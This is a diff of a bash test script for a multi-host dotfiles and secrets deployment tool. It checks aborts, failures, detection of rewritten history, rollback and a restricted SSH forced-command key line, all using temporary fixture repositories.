+check "push again, nothing new: all skipped, no new snapshot line" '(( rc == 0 )) && grep -q "nothing new" <<<"$out" && grep -q "^h1 .*skip (already at this snapshot)" <<<"$out" && ! grep -q " apply" "$t/ssh.log" && [[ $(wc -l < "$SN") == 1 ]]'
+dot4=$(commit "$t/dot-seed" .zshrc rc4 "dot four"); rm -f "$t/ticket"; printf 'q\n' > "$t/answers"   # dotfiles prompt: q
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
+check "q at the review: aborted, nothing applied"             '(( rc != 0 )) && grep -q "aborted at review" <<<"$out" && [[ $(dotat self) == "$dot3" && $(wc -l < "$SN") == 1 ]]'
+rm -f "$t/ticket"; : > "$t/ssh.log"
+out=$(echo wrong | fleet push 2>&1); rc=$?
+check "wrong sudo password: stops before any ssh"             '(( rc != 0 )) && [[ ! -s $t/ssh.log ]]'
+git -C "$t/home-h2/secrets" pull -q; echo k-h2b > "$t/home-h2/secrets/ssh/keys"; git -C "$t/home-h2/secrets" commit -qam h2b
+commit "$t/sec-seed" ssh/keys k-origin x >/dev/null
+rm -f "$t/ticket"; printf '\n\ny\n' > "$t/answers"   # dotfiles, secrets: keep; confirm
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
+check "h2 with out-of-sync secrets: FAILED, not updated; others go on" '(( rc != 0 )) && grep -q "^h2 .*FAILED secrets out of sync, not updated" <<<"$out" && [[ $(dotat h2) == "$dot3" && $(dotat h1) == "$dot4" && $(dotat self) == "$dot4" ]]'
+git -C "$t/home-h2/secrets" reset -q --hard '@{u}'
+dot5=$(commit "$t/dot-seed" .zshrc rc5 "dot five"); touch "$H/bootstrap.fail"; rm -f "$t/ticket"; printf '\ny\n' > "$t/answers"   # dotfiles: keep; confirm
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
+check "micro fails: nobody else is touched, no snapshot"      '(( rc != 0 )) && grep -q "^h1 .*not attempted (self failed)" <<<"$out" && [[ $(dotat h1) == "$dot4" && $(wc -l < "$SN") == 2 ]]'
+rm -f "$H/bootstrap.fail"
+git -C "$t/ab-seed" pull -q; git -C "$t/ab-seed" reset -q --hard "$ab3"; git -C "$t/ab-seed" push -q -f origin main
+rm -f "$t/ticket"; printf '\n\n\ny\n' > "$t/answers"
+out=$(echo pw-ok | fleet push 2>&1); rc=$?
+check "origin history rewritten (force push): stop, nothing applied" '(( rc != 0 )) && grep -q "history was rewritten" <<<"$out" && [[ $(dotat self) == "$dot5" && $(wc -l < "$SN") == 2 ]]'   # dot5: the failed push above moved micro before its stage failed
+git -C "$t/ab-seed" reset -q --hard "$ab_snap"; git -C "$t/ab-seed" push -q -f origin main
+rm -f "$t/ticket"; printf 'y\n' > "$t/answers"
+out=$(echo pw-ok | fleet rollback 2>&1); rc=$?
+check "rollback (micro only): self back to the previous snapshot" '(( rc == 0 )) && [[ $(dotat self) == "$dot3" ]] && [[ $(dotat h1) == "$dot4" ]] && grep -q "^h1 .*not touched" <<<"$out"'
+check "...recorded as the newest snapshot"                    '[[ $(tail -1 "$SN") == *" $dot3 "*rollback-of* ]]'
 
-# ---- the fleet line passes tools/authorized-keys check
+# ================= the fleet forced-command line passes tools/authorized-keys check
 s=$t/secrets; mkdir -p "$s/ssh/pubkeys" "$s/ssh/fleet" "$s/ssh/authorized_keys"
 ssh-keygen -q -t ed25519 -N '' -C peer -f "$t/peer"; ssh-keygen -q -t ed25519 -N '' -C fleet -f "$t/fleetkey"
 cp "$t/peer.pub" "$s/ssh/pubkeys/micro.pub"; cp "$t/fleetkey.pub" "$s/ssh/fleet/micro.pub"
 { printf 'from="100.64.0.9" %s\n' "$(cat "$t/peer.pub")"
-  printf 'from="100.64.0.9",command="%s/tools/fleet-apply",restrict %s\n' "$repo" "$(cat "$t/fleetkey.pub")"; } > "$s/ssh/authorized_keys/box"
+  printf 'from="100.64.0.9",command="%s/tools/fleet-apply",restrict %s\n' "/x" "$(cat "$t/fleetkey.pub")"; } > "$s/ssh/authorized_keys/box"
 check "fleet forced-command line passes authorized-keys check" 'SECRETS_DIR=$s AK_HOST=box AK_LIVE=$t/live "$root/tools/authorized-keys" check >/dev/null'
 
 echo; echo "$pass passed, $fail failed"; (( fail == 0 ))
